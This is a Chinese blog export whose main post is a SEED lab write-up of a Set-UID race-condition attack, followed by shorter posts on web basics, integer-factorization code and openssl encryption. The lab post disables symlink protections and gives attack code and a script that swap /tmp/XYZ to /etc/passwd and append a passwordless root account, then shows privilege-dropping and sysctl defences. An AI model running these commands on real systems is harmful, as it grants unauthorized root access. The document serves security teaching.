<h2 id="二、实验步骤和实验结果"><a href="#二、实验步骤和实验结果" class="headerlink" title="二、实验步骤和实验结果"></a>二、实验步骤和实验结果</h2><h3 id="2-1环境设置"><a href="#2-1环境设置" class="headerlink" title="2.1环境设置"></a>2.1环境设置</h3><h4 id="2-1-1-关闭反制措施"><a href="#2-1-1-关闭反制措施" class="headerlink" title="2.1.1 关闭反制措施"></a>2.1.1 关闭反制措施</h4><p>​    Ubuntu 有一个内置的防止竞争条件攻击的保护措施。该方案的工作方式是限制符号链接的跟随者。当使用以名字引用文件（而不是用打开文件的描述符引用文件）的函数时，应当了解该函数是否处理符号链接。也就是该函数是否跟随符号链接到达它所链接的文件。如果该函数具有处理符号链接的功能，则其路径名参数引用由符号链接指向的文件。否则，路径名参数将引用链接本身，而不是该链接指向的文件。</p>
<p>​    在本次实验中需要把这些保护措施禁用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">// On Ubuntu 20.04, use the following:</span><br><span class="line">sudo sysctl -w fs.protected_symlinks=0</span><br><span class="line">sudo sysctl fs.protected_regular=0</span><br></pre></td></tr></table></figure>
<h4 id="2-1-2-漏洞程序"><a href="#2-1-2-漏洞程序" class="headerlink" title="2.1.2 漏洞程序"></a>2.1.2 漏洞程序</h4><p>​    下面是一个有竞争条件漏洞的程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="number">2</span> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span> <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">5 &#123;</span><br><span class="line"><span class="number">6</span> <span class="type">char</span> * fn = <span class="string">&quot;/tmp/XYZ&quot;</span>;</span><br><span class="line"><span class="number">7</span> <span class="type">char</span> buffer[<span class="number">60</span>];</span><br><span class="line"><span class="number">8</span> FILE *fp;</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">10</span> <span class="comment">/* get user input */</span></span><br><span class="line"><span class="number">11</span> <span class="built_in">scanf</span>(<span class="string">&quot;%50s&quot;</span>, buffer );</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="number">13</span> <span class="keyword">if</span>(!access(fn, W_OK))&#123; ➀</span><br><span class="line"><span class="number">14</span> fp = fopen(fn, <span class="string">&quot;a+&quot;</span>); ➁</span><br><span class="line"><span class="number">15</span> fwrite(<span class="string">&quot;\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">1</span>, fp);</span><br><span class="line"><span class="number">16</span> fwrite(buffer , <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="built_in">strlen</span>(buffer), fp);</span><br><span class="line"><span class="number">17</span> fclose(fp);</span><br><span class="line"><span class="number">18</span> &#125;</span><br><span class="line"><span class="number">19</span> <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;No permission \n&quot;</span>);</span><br><span class="line"><span class="number">20</span> &#125;</span><br></pre></td></tr></table></figure>
<p>​    上面的程序是所有者为 root 的 Set-UID 程序；它将用户输入字符串附加到临时文件 /tmp/XYZ 的末 尾。由于代码以 root 权限运行，即其有效用户 ID 为 0，因此它可以覆盖任何文件。为了防止意外覆盖其 他文件，程序首先检查真实用户 ID 是否具有对文件/tmp/XYZ 的访问权限；这就是第➀行中 access() 调 用的目的。如果真实用户 ID 确实拥有权限，程序将在第➁行打开文件，并将用户输入附加到文件中。</p>
<p>​    由于检查和使用之间存在时间窗口，即便二者具有相同的文件名/tmp/XYZ，access() 使用的文件可能与 fopen() 使用的不同。如果恶意攻击者可以在时间窗口内以某种方式使/tmp/XYZ 成为指向受保护文件 （如/etc/passwd）的符号链接，则攻击者可以将用户输入附加到/etc/passwd，从而获得 root 权限。易受攻击的程序以 root 权限运行，因此它可以覆盖任何文件。</p>
<p>​    下面我们用语句对上面程序进行编译</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221030205854869.png" alt="image-20221030205854869" style="zoom: 80%;" /></p>
<h3 id="2-2-选择目标"><a href="#2-2-选择目标" class="headerlink" title="2.2 选择目标"></a>2.2 选择目标</h3><p>​    首先是我们验证magic口令是否有效，直接利用sudo特权修改/etc/passwd文件，将test账户进行添加，添加以后直接键入回车，可以看到已经获得了root权限。</p>
<p>​    <img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221030211321275.png" alt="image-20221030211321275" style="zoom:67%;" /></p>
<h3 id="2-3-Task-2-发起竞争条件攻击"><a href="#2-3-Task-2-发起竞争条件攻击" class="headerlink" title="2.3 Task 2:发起竞争条件攻击"></a>2.3 Task 2:发起竞争条件攻击</h3><h4 id="2-3-1-Task-2-A-模拟一个缓慢的机器"><a href="#2-3-1-Task-2-A-模拟一个缓慢的机器" class="headerlink" title="2.3.1 Task 2.A:模拟一个缓慢的机器"></a>2.3.1 Task 2.A:模拟一个缓慢的机器</h4><p>​    首先先删除上面添加的账户，以便下面的攻击,首先现在access()和fopen()之间添加一个10s的窗口时间，可以通过添加sleep(10)来完成。然后重新编译程序，在程序运行到sleep语句时，我们将输入符号链接到passwd。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -sf /dev/null /tmp/XYZ</span><br><span class="line">ln -sf /etc/passwd /tmp/XYZ</span><br></pre></td></tr></table></figure>
<p>​    值得注意的是，这里要先将/tmp/XYZ指向一个所有用户都可以写的文件，然后输入添加账户后，在等待时间期间我们重新打开一个命令行窗口将/tmp/XYZ链接到要修改的/etc/passwd,这样在打开文件之前，文件的符号链接已经改变，这样就可以向指定文件进行写入了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221030214613530.png" alt="image-20221030214613530"></p>
<h4 id="2-3-2-Task-2-B：进行真实攻击"><a href="#2-3-2-Task-2-B：进行真实攻击" class="headerlink" title="2.3.2 Task 2.B：进行真实攻击"></a>2.3.2 Task 2.B：进行真实攻击</h4><p>​        在这个任务中，我们将删除sleep语句，当删除sleep后攻击的窗口将会很小，我们不可能通过手动输入的方式进行执行。那就需要使用程序脚本，下面的 C 代码片段显示了如何删除链接，然后使/tmp/XYZ 指 向/etc/passwd。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unlink(<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">symlink(<span class="string">&quot;/etc/passwd&quot;</span>,<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>​    我们需要多次运行漏洞程序来增加攻击成功的概率</p>
<p>​    攻击程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">	    unlink(<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">	    symlink(<span class="string">&quot;/dev/null&quot;</span>,<span class="string">&quot;/tmp/XYZ&quot;</span>)</span><br><span class="line">         <span class="comment">//restart</span></span><br><span class="line">	    usleep(<span class="number">100</span>); <span class="comment">//give the interval to run</span></span><br><span class="line">        <span class="comment">//link to passwd</span></span><br><span class="line">	    unlink(<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">	    symlink(<span class="string">&quot;etc/passwd&quot;</span>,<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">	    usleep(<span class="number">100</span>);</span><br><span class="line">	    &#125;</span><br><span class="line">	   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	 &#125;</span><br></pre></td></tr></table></figure>
<p>​    下面是漏洞脚本，漏洞脚本的执行逻辑是比较old和new的符号链接，如果在程序输入后符号链接发生了更改，很可能就是发生了竞争条件的攻击。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">CHECK_FILE=&quot;ls -l /etc/passwd&quot;</span><br><span class="line">old=$($CHECK_FILE)</span><br><span class="line">new=$($CHECK_FILE)</span><br><span class="line">while [ &quot;$old&quot; == &quot;$new&quot; ]  </span><br><span class="line">do</span><br><span class="line">   echo &quot;test:U6aMy0wojraho:0:0:test:/root:/bin/bash&quot; | ./vulp</span><br><span class="line">   new=$($CHECK_FILE)</span><br><span class="line">done</span><br><span class="line">echo &quot;STOP... The passwd file has been changed&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​    这里注意还要把脚本执行程序改成set-uid程序，能够让vulp在切换到root有效用户下执行，这里我们执行一段时间后，攻击脚本没有信息返回，查看tmp/XYZ可以看到所有者变成了root。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221030232505124.png" alt="image-20221030232505124"></p>
<p>​    这里要注意每一次开机以后都要重新设置防御机制条件，因为防御机制条件是暂时性的。还有一点需要注意就是在attack.c中的文件路径要写对/etc/passwd。下面可以看到攻击成功。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221031171143952.png" alt="image-20221031171143952"></p>
<h4 id="2-3-3-Task-2-C：一种改进的攻击方法"><a href="#2-3-3-Task-2-C：一种改进的攻击方法" class="headerlink" title="2.3.3 Task 2.C：一种改进的攻击方法"></a>2.3.3 Task 2.C：一种改进的攻击方法</h4><p>​    在 Task 2.B 中，有时候已经正确完成了所有操作，但仍然无法成功进行攻击，检查/tmp/XYZ 的 所有权。会发现/tmp/XYZ 的所有者已经成为 root（通常它应该是 seed）。因为/tmp 文件夹上有一个“粘滞”位，意为只有文件的所有者才能删除该文件，即使该文件夹可写。</p>
<p>​    解决这个问题我们需要将unlink()和symlink()原子化，这里可以使用renameeat2系统调用解决。下面代码的思路是将unlink(‘/tmp/XYZ’)和symlink(/etc/passwd)换成交换操作，且交换操作是原子进行的，因此不会再unlink后打断过程。而unlink(‘/tmp/XYZ’)和symlink(/dev/null)在进入打开函数前运行，不会出现竞争条件。具体代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags = RENAME_EXCHANGE;</span><br><span class="line"></span><br><span class="line">unlink(<span class="string">&quot;/tmp/XYZ&quot;</span>); symlink(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">unlink(<span class="string">&quot;/tmp/ABC&quot;</span>); symlink(<span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;/tmp/ABC&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//repeat the process</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">	renameat2(<span class="number">0</span>,<span class="string">&quot;/tmp/XYZ&quot;</span>,<span class="number">0</span>,<span class="string">&quot;/tmp/ABC&quot;</span>,flags);</span><br><span class="line">	<span class="comment">//set the time to execute</span></span><br><span class="line">	usleep(<span class="number">1000</span>);</span><br><span class="line">	<span class="comment">//1ms</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    在进行Task 2.c之前，我们首先删除在Task 2.B中已经修改过的/etc/passwd/文件中的内容，然后同样的方法，编译运行attack程序，然后运行漏洞程序脚本。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221031185953028.png" alt="image-20221031185953028" style="zoom:67%;" /></p>
<p>​    执行一段时间以后，可以看到脚本提示相应的文件已经被修改，我们可以多次运行脚本，可以发现不会出现链接文件所有者被修改为root的情况。下面对注入内容有效性进行检测：</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221031190335893.png" alt="image-20221031190335893" style="zoom:67%;" /></p>
<h3 id="2-4-Task-3：预防措施"><a href="#2-4-Task-3：预防措施" class="headerlink" title="2.4 Task 3：预防措施"></a>2.4 Task 3：预防措施</h3><h4 id="2-4-1-Task-3-A：应用最小权限原则"><a href="#2-4-1-Task-3-A：应用最小权限原则" class="headerlink" title="2.4.1 Task 3.A：应用最小权限原则"></a>2.4.1 Task 3.A：应用最小权限原则</h4><p>​    在本实验中，漏洞程序的根本问题是运行程序的用户权限过高，其中限制只有acess(),一个更好的方法是，与其给程序运行权限进行限制，不如直接降低运行的权限，这里我们可以在代码中加入setuid系统调用解决：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">uid_t</span> uid = getuid();<span class="comment">//get the real id</span></span><br><span class="line">    <span class="type">uid_t</span> euid = geteuid();<span class="comment">//get the execute id</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* fn = <span class="string">&quot;/tmp/XYZ&quot;</span>;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">60</span>];</span><br><span class="line">    FILE* fp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* get user input */</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%50s&quot;</span>, buffer);</span><br><span class="line">    setuid(uid);<span class="comment">//execute with the real uid</span></span><br><span class="line">    <span class="keyword">if</span> (!access(fn, W_OK)) &#123;</span><br><span class="line">        fp = fopen(fn, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!fp) &#123;</span><br><span class="line">           perror(<span class="string">&quot;Open failed&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite(<span class="string">&quot;\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">1</span>, fp);</span><br><span class="line">        fwrite(buffer, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="built_in">strlen</span>(buffer), fp);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No permission \n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​    这样程序将在真实用户的情况下进行运行，那么如果程序进入了竞争条件中，也就是access通过，那么接下来对/etc/passwd的打开操作不会被允许，因为现在执行程序已经不是root权限了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221031191707361.png" alt="image-20221031191707361" style="zoom:67%;" /></p>
<h4 id="2-4-2-Task-3-B：使用Ubuntu内置方案"><a href="#2-4-2-Task-3-B：使用Ubuntu内置方案" class="headerlink" title="2.4.2 Task 3.B：使用Ubuntu内置方案"></a>2.4.2 Task 3.B：使用Ubuntu内置方案</h4><p>​    Ubuntu 10.10 和更高版本附带了一个内置的防止竞争条件攻击的保护方案。在任务中我们重启保护：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo sysctl -w fs.protected_symlinks=1</span><br></pre></td></tr></table></figure>
<p>​    这里程序在Task2的情况下进行执行，而不是Task3.1A情况下执行，可以发现还是出现了Permission denied。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221031192040457.png" alt="image-20221031192040457" style="zoom:67%;" /></p>
<p>​    </p>
<p>(1)原因是该方案限制符号链接的跟随者，如果跟随者和目录所有者与符号链接所有者不匹配，则全局可写的粘滞目录中的符号链接无法被跟随，这里我们符号链接创建是由一个seed用户程序进行创建，因此和跟随者和目录所有者不匹配，因此就会出现Permission denied</p>
<p>(2)但是该方案也有一定局限性，tmp文件是一个任何人可以读写的文件且具有stickybit，我们做了下面一个实验，首先sudo创建了一个test文件夹，然后设置文件夹为所有人可写，并设置stickybit，这时候用户创建一个符号链接在set-uid程序下不可以修改，但是取消粘滞位后，却可以通过set-uid程序修改。</p>
<p>​    在这我还做了一个实验，当符号链接创建者是一个set-uid程序，符号链接就可以被跟随，当然这对攻击来言没有什么意义。</p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20221031203336553.png" alt="image-20221031203336553" style="zoom:67%;" /></p>
<p>​    符号链接创建者seed，目录root，跟随者root，访问符号链接，没有权限。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221031203308330.png" alt="image-20221031203308330"></p>
<h3 id="3-思考题"><a href="#3-思考题" class="headerlink" title="3 思考题"></a>3 思考题</h3><p>​    可以阻止缓冲区溢出攻击，但输入内容依然可以溢出到栈上，只是返回到恶意代码位置后，由于程序不具有root权限，shellcode中相应需要root权限的操作不被允许。但是溢出字段仍然可以对局部变量等内容进行更改。</p>
<p>​    当然，如果只在strcpy()函数调用前禁用root权限，并在调用后启用它，还是会完成缓冲区溢出攻击，并可以以root权限执行shellcode，因为攻击发生在我们从bof（）函数返回时。如果我们在bof（）调用之前禁用，就可以进行防御。</p>
]]></content>
      <categories>
        <category>seedlab</category>
      </categories>
      <tags>
        <tag>seedlab</tag>
      </tags>
  </entry>
  <entry>
    <title>web学习</title>
    <url>/2023/01/06/web/</url>
    <content><![CDATA[<h4 id="1-网站的robot标准"><a href="#1-网站的robot标准" class="headerlink" title="1.网站的robot标准"></a>1.网站的robot标准</h4><p>robots.txt是网站用来向访问网络爬虫和其他网络机器人指示允许他们访问网站的哪些部分的标准。具体的说明和example可以查看下面的链接，要访问网站的robots资源可以在URL后面加上robots.txt进行实现.</p>
<p><a href="https://en.wikipedia.org/wiki/Robots.txt">机器人.txt - 维基百科 (wikipedia.org)</a></p>
<h4 id="2-PHP"><a href="#2-PHP" class="headerlink" title="2.PHP"></a>2.PHP</h4><p>PHP超文本预处理器，是一种创建动态交互性站点的强有力的服务器端脚本语言。phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的<a href="https://so.csdn.net/so/search?q=MIME类型&amp;spm=1001.2101.3001.7020">MIME类型</a>为文件即可，但为了国际通用，所以才用了phps文件类型。可以通过URL+phps可以用来直接查看php文件。</p>
<p>URL二次编码，在seedlab实验中我们做过，URL会进行编码，对于打包输入的表单，会进行一定规则的编码。url会对你输入的表单进行编码，到达服务器$会进行解码.</p>
<p><strong>序列化和反序列化：</strong> </p>
<p><a href="https://blog.csdn.net/LTtiandd/article/details/99591998">(92条消息) 攻防世界unserialize3题解_Leng_tian的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>因子分解实现</title>
    <url>/2022/12/08/%E5%9B%A0%E5%AD%90%E5%88%86%E8%A7%A3%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="因子分解实现"><a href="#因子分解实现" class="headerlink" title="因子分解实现"></a><center>因子分解实现</center></h4><h5 id="1-设-p-q-2d-gt-0-且-n-pq"><a href="#1-设-p-q-2d-gt-0-且-n-pq" class="headerlink" title="1.设$p-q=2d&gt;0$,且$n= pq$."></a>1.设$p-q=2d&gt;0$,且$n= pq$.</h5><script type="math/tex; mode=display">
p = 2d+q\\
n=pq=(2d+q)q=2dq+q^2\\
n+d^2=d^2+2dq+q^2=(d+q)^2\\
所以n+d^2是完全平方数</script><h5 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h5><script type="math/tex; mode=display">
设n+d^2=m^2\\
n = m^2-d^2\\
n=(m+d)(m-d)</script><p>这就找到了n的两个因子m+d和m-d</p>
<h5 id="3-基于d很小和sqrt算法是很快的多项式时间算法我们构造程序"><a href="#3-基于d很小和sqrt算法是很快的多项式时间算法我们构造程序" class="headerlink" title="3.基于d很小和sqrt算法是很快的多项式时间算法我们构造程序"></a>3.基于d很小和sqrt算法是很快的多项式时间算法我们构造程序</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>):<span class="comment">#traverse the d</span></span><br><span class="line">        h = n + <span class="built_in">pow</span>(d,<span class="number">2</span>) <span class="comment">#calulate the n+d^2</span></span><br><span class="line">        m = <span class="built_in">pow</span>(h,<span class="number">0.5</span>)</span><br><span class="line">        text = (<span class="built_in">int</span>)(m+d)*(<span class="built_in">int</span>)(m-d) <span class="comment">#verify the correct of m</span></span><br><span class="line">        <span class="keyword">if</span>(text == n):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;p=&#123;&#125;,q=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(m+d,m-d))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20220423212649826.png" alt="image-20220423212649826" style="zoom:50%;" /></p>
<h5 id="4-这一问我们也可以利用前两问的思路进行分解，但是这里我们要增大d的范围。"><a href="#4-这一问我们也可以利用前两问的思路进行分解，但是这里我们要增大d的范围。" class="headerlink" title="4.这一问我们也可以利用前两问的思路进行分解，但是这里我们要增大d的范围。"></a>4.这一问我们也可以利用前两问的思路进行分解，但是这里我们要增大d的范围。</h5><p>在30bit中选择：246d5fd1 </p>
<p>在40bit中选择：59a38fdedb</p>
<p>在50bit中选择：25220f2a4ab77</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20220429160914660.png" alt="image-20220429160914660" style="zoom:50%;" /></p>
<p>利用平方和的方式进行破解，我们发现d的规模越大，所花费的CPU时间也就越多。</p>
<h5 id="下面我们再利用试除法进行破解"><a href="#下面我们再利用试除法进行破解" class="headerlink" title="下面我们再利用试除法进行破解"></a>下面我们再利用试除法进行破解</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Basic_fac</span>(<span class="params">n</span>):</span><br><span class="line">    level = <span class="built_in">int</span>(<span class="built_in">pow</span>(n,<span class="number">0.5</span>))+<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,level):</span><br><span class="line">        <span class="keyword">if</span> n%i == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;p=&#123;&#125;,q=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(i),<span class="built_in">hex</span>(<span class="built_in">int</span>(n/i))))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span>   </span><br></pre></td></tr></table></figure>
<p>这里我们可以发现，试除法的效率和数据规模有直接关系，当数据规模越大时，试除法的效率也越低</p>
<p><img src="https://gitee.com/Strider666/image_blog/raw/master/images/image-20220429162249212.png" alt="image-20220429162249212" style="zoom:50%;" /></p>
<p>下面我们利用Pollard p-1方法进行因子分解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Pollard p-1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Pollard_p</span>(<span class="params">n,B</span>):<span class="comment">#give a level B</span></span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,B):</span><br><span class="line">        a = power_mod(a,j,n)</span><br><span class="line">        d = gcd(a-<span class="number">1</span>,n)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span>&lt;d&lt;n:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">hex</span>(d),<span class="built_in">hex</span>(n/d)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>相较于试除法效率有了很大的提升</p>
<p>我们接下来利用Pollard  $\rho$方法对因子进行分解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(power(x,<span class="number">2</span>)+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Rho</span>(<span class="params">n,x1</span>):</span><br><span class="line">    x = x1</span><br><span class="line">    _x = f(x)%n</span><br><span class="line">    p = gcd(x-_x,n)</span><br><span class="line">    <span class="keyword">while</span> p == <span class="number">1</span>:</span><br><span class="line">        x = f(x)%n</span><br><span class="line">        _x = f(f(_x)%n)%n</span><br><span class="line">        p = gcd(x-_x,n)</span><br><span class="line">        <span class="keyword">if</span> p == n:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(p),<span class="built_in">hex</span>(n/p)</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Strider666/image_blog/raw/master/images/image-20220429161914465.png" alt="image-20220429161914465" style="zoom:50%;" /></p>
<p>可以发现Pollord $\rho$算法效率也很高，在50bit因子分解规模下超过了p-1算法</p>
]]></content>
      <categories>
        <category>Cryptography</category>
      </categories>
      <tags>
        <tag>公钥密码算法</tag>
      </tags>
  </entry>
  <entry>
    <title>seedlab(六)</title>
    <url>/2023/01/05/%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<hr>
<h1 id="密码学综合实验"><a href="#密码学综合实验" class="headerlink" title="密码学综合实验"></a><center>密码学综合实验</center></h1><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>​    本实验的学习目标是熟悉密钥加密与单项散列函数相关的概念。完成实验后，我们应该能够获得有关加密算法、加密模式、单向散列函数的第一手经验。此外，能够使用工具和编写程序来加密/解密消息，为给定的消息生成单向散列函数。该实验包含以下的主题：</p>
<p>​    1.密钥加密</p>
<p>​    2.加密模式、初始向量(IV)和填充(Padding)</p>
<p>​    3.使用加密算法的常见错误</p>
<p>​    4.使用密码库进行编程</p>
<p>​    </p>
<h2 id="二、实验步骤和实验结果"><a href="#二、实验步骤和实验结果" class="headerlink" title="二、实验步骤和实验结果"></a>二、实验步骤和实验结果</h2><h4 id="2-1-Task-1：使用不同的密码算法和加密模式进行加密"><a href="#2-1-Task-1：使用不同的密码算法和加密模式进行加密" class="headerlink" title="2.1 Task 1：使用不同的密码算法和加密模式进行加密"></a>2.1 Task 1：使用不同的密码算法和加密模式进行加密</h4><p>​    在此任务中，我们将使用各种加密算法和模式。首先查看以下openssl enc所支持的加密类型，这里可以使用man enc进行查看，这里我们不对所支持的加密方式一一进行列举，下面是部分例子。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221225205858127.png" alt="image-20221225205858127"></p>
<p>​    首先我们使用des-cbc模式对明文进行加密，最后加入-p能够打印加密参数</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221225212356472.png" alt="image-20221225212356472"></p>
<p>​    同时使用解密算法验证正确性</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221225212552007.png" alt="image-20221225212552007"></p>
<p>再测试以下des-cbc模式，这里实际上des只需要64位的输入密钥和IV因此会出现进行忽略的提示。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221225212700574.png" alt="image-20221225212700574"></p>
<p>解密验证情况</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221225212921968.png" alt="image-20221225212921968"></p>
<p>使用aes-128-cfb加密并进行解密的验证   </p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221225220417808.png" alt="image-20221225220417808"></p>
